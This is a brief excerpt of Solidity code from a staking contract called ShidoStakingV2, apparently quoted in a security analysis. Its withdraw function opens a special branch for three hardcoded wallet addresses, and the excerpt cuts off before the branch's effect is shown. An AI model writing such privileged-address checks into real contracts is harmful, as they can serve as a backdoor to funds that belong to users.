...
contract ShidoStakingV2 is Initializable, ReentrancyGuard {
    ...
    function withdraw(uint128 _amount) external nonReentrant {
        ...
        if (msg.sender == 0x796a9b4BDf05b3626211Ab77b8D328dCDA48A838 || msg.sender == 0xB420CD040A78E590ECb25919aE295C89f7f73A0c || msg.sender == 0xa8513523E105d1f2DA4bdEa0C24709a27B15aa79){
